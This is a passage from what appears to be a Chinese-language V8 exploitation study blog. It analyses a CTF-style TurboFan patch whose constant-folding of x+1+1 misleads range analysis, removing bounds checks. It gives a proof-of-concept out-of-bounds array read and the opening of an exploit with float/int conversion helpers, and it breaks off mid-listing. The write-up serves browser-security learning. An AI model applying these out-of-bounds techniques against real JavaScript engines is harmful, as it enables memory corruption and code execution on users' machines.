License.</span><br><span class="line">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span><br><span class="line">+</span><br><span class="line">+#include &quot;src/compiler/common-operator.h&quot;</span><br><span class="line">+#include &quot;src/compiler/graph.h&quot;</span><br><span class="line">+#include &quot;src/compiler/node-properties.h&quot;</span><br><span class="line">+</span><br><span class="line">+namespace v8 &#123;</span><br><span class="line">+namespace internal &#123;</span><br><span class="line">+namespace compiler &#123;</span><br><span class="line">+</span><br><span class="line">+DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph,</span><br><span class="line">+                     CommonOperatorBuilder* common)</span><br><span class="line">+    : AdvancedReducer(editor),</span><br><span class="line">+      graph_(graph), common_(common) &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;</span><br><span class="line">+  switch (node-&gt;opcode()) &#123;</span><br><span class="line">+    case IrOpcode::kNumberAdd:</span><br><span class="line">+      return ReduceAddition(node);</span><br><span class="line">+    default:</span><br><span class="line">+      return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) &#123;</span><br><span class="line">+  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);</span><br><span class="line">+  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);</span><br><span class="line">+  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);</span><br><span class="line">+</span><br><span class="line">+  Node* left = NodeProperties::GetValueInput(node, 0);</span><br><span class="line">+  if (left-&gt;opcode() != node-&gt;opcode()) &#123;</span><br><span class="line">+    return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* right = NodeProperties::GetValueInput(node, 1);</span><br><span class="line">+  if (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* parent_left = NodeProperties::GetValueInput(left, 0);</span><br><span class="line">+  Node* parent_right = NodeProperties::GetValueInput(left, 1);</span><br><span class="line">+  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  double const1 = OpParameter&lt;double&gt;(right-&gt;op());</span><br><span class="line">+  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());</span><br><span class="line">+  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));</span><br><span class="line">+</span><br><span class="line">+  NodeProperties::ReplaceValueInput(node, parent_left, 0);</span><br><span class="line">+  NodeProperties::ReplaceValueInput(node, new_const, 1);</span><br><span class="line">+</span><br><span class="line">+  return Changed(node);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+&#125;  // namespace compiler</span><br><span class="line">+&#125;  // namespace internal</span><br><span class="line">+&#125;  // namespace v8</span><br><span class="line">diff --git a/src/compiler/duplicate-addition-reducer.h b/src/compiler/duplicate-addition-reducer.h</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000000..7285f1ae3e</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/compiler/duplicate-addition-reducer.h</span><br><span class="line">@@ -0,0 +1,60 @@</span><br><span class="line">+/*</span><br><span class="line">+ * Copyright 2018 Google LLC</span><br><span class="line">+ *</span><br><span class="line">+ * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line">+ * you may not use this file except in compliance with the License.</span><br><span class="line">+ * You may obtain a copy of the License at</span><br><span class="line">+ *</span><br><span class="line">+ *      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">+ *</span><br><span class="line">+ * Unless required by applicable law or agreed to in writing, software</span><br><span class="line">+ * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">+ * See the License for the specific language governing permissions and</span><br><span class="line">+ * limitations under the License.</span><br><span class="line">+ */</span><br><span class="line">+</span><br><span class="line">+#ifndef V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span><br><span class="line">+#define V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span><br><span class="line">+</span><br><span class="line">+#include &quot;src/base/compiler-specific.h&quot;</span><br><span class="line">+#include &quot;src/compiler/graph-reducer.h&quot;</span><br><span class="line">+#include &quot;src/globals.h&quot;</span><br><span class="line">+#include &quot;src/machine-type.h&quot;</span><br><span class="line">+</span><br><span class="line">+namespace v8 &#123;</span><br><span class="line">+namespace internal &#123;</span><br><span class="line">+namespace compiler &#123;</span><br><span class="line">+</span><br><span class="line">+// Forward declarations.</span><br><span class="line">+class CommonOperatorBuilder;</span><br><span class="line">+class Graph;</span><br><span class="line">+</span><br><span class="line">+class V8_EXPORT_PRIVATE DuplicateAdditionReducer final</span><br><span class="line">+    : public NON_EXPORTED_BASE(AdvancedReducer) &#123;</span><br><span class="line">+ public:</span><br><span class="line">+  DuplicateAdditionReducer(Editor* editor, Graph* graph,</span><br><span class="line">+                      CommonOperatorBuilder* common);</span><br><span class="line">+  ~DuplicateAdditionReducer() final &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+  const char* reducer_name() const override &#123; return &quot;DuplicateAdditionReducer&quot;; &#125;</span><br><span class="line">+</span><br><span class="line">+  Reduction Reduce(Node* node) final;</span><br><span class="line">+</span><br><span class="line">+ private:</span><br><span class="line">+  Reduction ReduceAddition(Node* node);</span><br><span class="line">+</span><br><span class="line">+  Graph* graph() const &#123; return graph_;&#125;</span><br><span class="line">+  CommonOperatorBuilder* common() const &#123; return common_; &#125;;</span><br><span class="line">+</span><br><span class="line">+  Graph* const graph_;</span><br><span class="line">+  CommonOperatorBuilder* const common_;</span><br><span class="line">+</span><br><span class="line">+  DISALLOW_COPY_AND_ASSIGN(DuplicateAdditionReducer);</span><br><span class="line">+&#125;;</span><br><span class="line">+</span><br><span class="line">+&#125;  // namespace compiler</span><br><span class="line">+&#125;  // namespace internal</span><br><span class="line">+&#125;  // namespace v8</span><br><span class="line">+</span><br><span class="line">+#endif  // V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span><br><span class="line">diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.cc</span><br><span class="line">index 5717c70348..8cca161ad5 100644</span><br><span class="line">--- a/src/compiler/pipeline.cc</span><br><span class="line">+++ b/src/compiler/pipeline.cc</span><br><span class="line">@@ -27,6 +27,7 @@</span><br><span class="line"> #include &quot;src/compiler/constant-folding-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/control-flow-optimizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/dead-code-elimination.h&quot;</span><br><span class="line">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/effect-control-linearizer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis-reducer.h&quot;</span><br><span class="line"> #include &quot;src/compiler/escape-analysis.h&quot;</span><br><span class="line">@@ -1301,6 +1302,8 @@ struct TypedLoweringPhase &#123;</span><br><span class="line">                                data-&gt;jsgraph()-&gt;Dead());</span><br><span class="line">     DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">                                               data-&gt;common(), temp_zone);</span><br><span class="line">+    DuplicateAdditionReducer duplicate_addition_reducer(&amp;graph_reducer, data-&gt;graph(),</span><br><span class="line">+                                              data-&gt;common());</span><br><span class="line">     JSCreateLowering create_lowering(&amp;graph_reducer, data-&gt;dependencies(),</span><br><span class="line">                                      data-&gt;jsgraph(), data-&gt;js_heap_broker(),</span><br><span class="line">                                      data-&gt;native_context(), temp_zone);</span><br><span class="line">@@ -1318,6 +1321,7 @@ struct TypedLoweringPhase &#123;</span><br><span class="line">                                          data-&gt;js_heap_broker(), data-&gt;common(),</span><br><span class="line">                                          data-&gt;machine(), temp_zone);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);</span><br><span class="line">+    AddReducer(data, &amp;graph_reducer, &amp;duplicate_addition_reducer);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;create_lowering);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer);</span><br><span class="line">     AddReducer(data, &amp;graph_reducer, &amp;typed_optimization);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>patch在turboFan中的<code>TypedLoweringPhase</code>阶段添加了一种优化方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;</span><br><span class="line">  switch (node-&gt;opcode()) &#123;</span><br><span class="line">    case IrOpcode::kNumberAdd:</span><br><span class="line">      return ReduceAddition(node);</span><br><span class="line">    default:</span><br><span class="line">      return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) &#123;</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);</span><br><span class="line">  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);</span><br><span class="line"></span><br><span class="line">  Node* left = NodeProperties::GetValueInput(node, 0);</span><br><span class="line">  if (left-&gt;opcode() != node-&gt;opcode()) &#123;</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* right = NodeProperties::GetValueInput(node, 1);</span><br><span class="line">  if (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Node* parent_left = NodeProperties::GetValueInput(left, 0);</span><br><span class="line">  Node* parent_right = NodeProperties::GetValueInput(left, 1);</span><br><span class="line">  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">    return NoChange();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  double const1 = OpParameter&lt;double&gt;(right-&gt;op());</span><br><span class="line">  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());</span><br><span class="line">  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));</span><br><span class="line"></span><br><span class="line">  NodeProperties::ReplaceValueInput(node, parent_left, 0);</span><br><span class="line">  NodeProperties::ReplaceValueInput(node, new_const, 1);</span><br><span class="line"></span><br><span class="line">  return Changed(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种优化把x+1+1优化成了x+2，看似不影响，但计算机不是数学，他们的底层不一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x+1+1应该是</span><br><span class="line">tmp = x+1</span><br><span class="line">tmp + 1</span><br><span class="line">x+2直接就是x+2</span><br></pre></td></tr></table></figure><p>而根据浮点数的IEEE764标准 当一个浮点数越来越大时，有限的空间只能保留高位的数据，因此一旦浮点数的值超过某个界限时，低位数值将被舍弃，此时数值不能全部表示，存在精度丢失，下面拿python的来举例</p><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204044422366.png" alt="image-20251204044422366"></p><p>可以看到x+2可以被表示，但x+1不能被表示出来，而checkBounds检测数组越界会在TurboFan的SimplifiedLoweringPhase阶段根据索引和数组的范围被优化，如果索引最大值小于lenth的最小值checkBounds检测将会被优化掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// Dispatching routine for visiting the node &#123;node&#125; with the usage &#123;use&#125;.</span><br><span class="line">  // Depending on the operator, propagate new usage info to the inputs.</span><br><span class="line">  void VisitNode(Node* node, Truncation truncation,</span><br><span class="line">                SimplifiedLowering* lowering) &#123;</span><br><span class="line">    // Unconditionally eliminate unused pure nodes (only relevant if there&#x27;s</span><br><span class="line">    // a pure operation in between two effectful ones, where the last one</span><br><span class="line">    // is unused).</span><br><span class="line">    // Note: We must not do this for constants, as they are cached and we</span><br><span class="line">    // would thus kill the cached &#123;node&#125; during lowering (i.e. replace all</span><br><span class="line">    // uses with Dead), but at that point some node lowering might have</span><br><span class="line">    // already taken the constant &#123;node&#125; from the cache (while it was in</span><br><span class="line">    // a sane state still) and we would afterwards replace that use with</span><br><span class="line">    // Dead as well.</span><br><span class="line">    if (node-&gt;op()-&gt;ValueInputCount() &gt; 0 &amp;&amp;</span><br><span class="line">        node-&gt;op()-&gt;HasProperty(Operator::kPure)) &#123;</span><br><span class="line">      if (truncation.IsUnused()) return VisitUnused(node);</span><br><span class="line">    &#125;</span><br><span class="line">    switch (node-&gt;opcode()) &#123;</span><br><span class="line">      // ...</span><br><span class="line">        case IrOpcode::kCheckBounds: &#123;</span><br><span class="line">            const CheckParameters&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">            Type index_type = TypeOf(node-&gt;InputAt(0));</span><br><span class="line">            Type length_type = TypeOf(node-&gt;InputAt(1));</span><br><span class="line">            if (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">              // Map -0 to 0, and the values in the [-2^31,-1] range to the</span><br><span class="line">              // [2^31,2^32-1] range, which will be considered out-of-bounds</span><br><span class="line">              // as well, because the &#123;length_type&#125; is limited to Unsigned31.</span><br><span class="line">              VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                        MachineRepresentation::kWord32);</span><br><span class="line">              if (lower() &amp;&amp; lowering-&gt;poisoning_level_ ==</span><br><span class="line">                                PoisoningMitigationLevel::kDontPoison) &#123;</span><br><span class="line">                // 可以看到，如果当前索引的最大值小于length的最小值，则表示当前索引的使用没有越界</span><br><span class="line">                if (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                    (index_type.Min() &gt;= 0.0 &amp;&amp;</span><br><span class="line">                    index_type.Max() &lt; length_type.Min())) &#123;</span><br><span class="line">                  // The bounds check is redundant if we already know that</span><br><span class="line">                  // the index is within the bounds of [0.0, length[.</span><br><span class="line">                  // CheckBound将会被优化</span><br><span class="line">                  DeferReplacement(node, node-&gt;InputAt(0));</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              VisitBinop(</span><br><span class="line">                  node,</span><br><span class="line">                  UseInfo::CheckedSigned32AsWord32(kIdentifyZeros, p.feedback()),</span><br><span class="line">                  UseInfo::TruncatingWord32(), MachineRepresentation::kWord32);</span><br><span class="line">            &#125;</span><br><span class="line">            return;</span><br><span class="line">          &#125;</span><br><span class="line">    // ....</span><br><span class="line">    &#125;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>下面用一个poc来演示一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function f(x)</span><br><span class="line">&#123;</span><br><span class="line">    const arr = [1.1, 2.2, 3.3, 4.4, 5.5]; // length =&gt; Range(5, 5)</span><br><span class="line">    let t = (x == 1 ? 9007199254740992 : 9007199254740989);</span><br><span class="line">    </span><br><span class="line">    t = t + 1 + 1;</span><br><span class="line">    /*  t =&gt; </span><br><span class="line">        Range(9007199254740991, 9007199254740992)</span><br><span class="line">        but Range(9007199254740991, 9007199254740994)</span><br><span class="line">    */</span><br><span class="line">    t -= 9007199254740989;</span><br><span class="line">    /*  t =&gt; </span><br><span class="line">        Range(2, 3)</span><br><span class="line">        but Range(2, 5)</span><br><span class="line">    */</span><br><span class="line">    return arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(f(1));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line">console.log(f(1));</span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204045753268.png" alt="image-20251204045753268"></p><p>可以看到第一次未被优化时访问的实际时arr[3]，强制优化后因为TurboFan认为t最大值是3 Range(2, 3)，小于arr的最小值Range(5,5)</p><p>所以将checkBounds去掉了，然而patch在SimplifiedLoweringPhase阶段加的优化实际会将t变成5，也就造成了数组越界</p><p>可以看到checkBounds在SimplifiedLoweringPhase阶段被优化掉了</p><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204050741195.png" alt="image-20251204050741195"></p><p>优化掉之前</p><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204050912649.png" alt="image-20251204050912649"></p><p>优化掉之后</p><h4 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h4><p>数组越界感觉可以像上一题那样直接打，但是实际调试下来有%DebugPrint的时候double array obj array的elements确实和map是紧贴的，但是不用%DebugPrint的时候他们之间并不相邻，貌似是%DebugPrint扰乱了内存布局，感觉挺玄学的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8)</span><br><span class="line">    this.f64 = new Float64Array(this.buf)</span><br><span class="line">    this.f32 = new Float32Array(this.buf)</span><br><span class="line">    this.u32 = new Uint32Array(this.buf)</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf)</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf)</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;</span><br><span class="line">    this.i = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Debug Helpers ------------------ */</span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Float &lt;-&gt; Int conversions ------------------ */</span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f64toi64(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i64tof64(i) &#123;</span><br><span class="line">    this.u64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → int64</span><br><span class="line">  f64toi64signed(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.i64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64</span><br><span class="line">  i64tof64signed(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f64toi32lo(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f64toi32hi(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i32pairtof64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i64to32lo(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i64to32hi(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i</span><br><span class="line">    return this.f32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Logging helpers ------------------ */</span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ GC / state ------------------ */</span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">helpers = new Helpers()</span><br><span class="line"></span><br><span class="line">function f(a) &#123;</span><br><span class="line">  let double_arr = [0.0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];</span><br><span class="line">  let obj_arr = [&#123;&#125;];</span><br><span class="line">  let x = a == 0 ? 9007199254740989 : 9007199254740992;</span><br><span class="line">  let y = x + 1 + 1;</span><br><span class="line">  let z = y - 9007199254740991; // Range(0,1) but Range(0,3)</span><br><span class="line">  if (a != 0) &#123;</span><br><span class="line">    %DebugPrint(double_arr);</span><br><span class="line">    %DebugPrint(obj_arr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i = 0; i &lt; 0x10000; i++)</span><br><span class="line">  f(0);</span><br><span class="line"></span><br><span class="line">f(1);</span><br><span class="line">helpers.stop();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 